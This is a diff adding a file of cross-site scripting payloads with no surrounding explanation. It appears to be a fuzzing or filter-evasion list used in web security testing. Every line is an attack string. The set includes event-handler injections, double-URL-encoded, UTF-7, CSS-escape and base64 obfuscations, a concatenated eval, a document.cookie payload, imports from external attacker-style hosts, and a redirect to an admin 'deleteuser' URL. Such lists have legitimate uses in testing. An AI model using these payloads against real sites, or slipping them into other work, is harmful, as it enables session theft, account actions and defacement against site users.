@@ -1,0 +1,58 @@
+<iframe/src \/\/onload = prompt(1)>
+<iframe/onreadystatechange=alert(1)>
+<svg/onload=alert(1)>
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
+<img src ?itworksonchrome?\/onerror = alert(1)>
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+%253cscript%253ealert(1)%253c/script%253e
+<IMG SRC=”javascript:alert(‘XSS’)”>
+javascript:alert("hellox worldss")>
+<h1><font color=blue>hellox worldss</h1>
+<div style="font-family:'foo&#10;;color:red;';">LOL
+&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
+&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
+žscriptualert(EXSSE)ž/scriptu
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"
+&lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
+exp/*&lt;A STYLE='no\xss&#58;noxss(\"*//*\");
+xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;
+&lt;!--&#91;if gte IE 4&#93;&gt;
+&lt;!&#91;endif&#93;--&gt;
+&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
+&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+&lt;HTML&gt;&lt;BODY&gt;
+&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;
+&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+&lt;? echo('&lt;SCR)';
+&lt;IMG SRC=\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;
+Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
+&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
+&lt;IMG SRC=\"javascript&#058;alert('XSS')\"
+<IMG SRC=javascrscriptipt:alert('XSS')>
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
+<frameset onload=alert(123)>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
++ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
+%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
++ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
+%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
+%253cscript%253ealert(document.cookie)%253c/script%253e
+
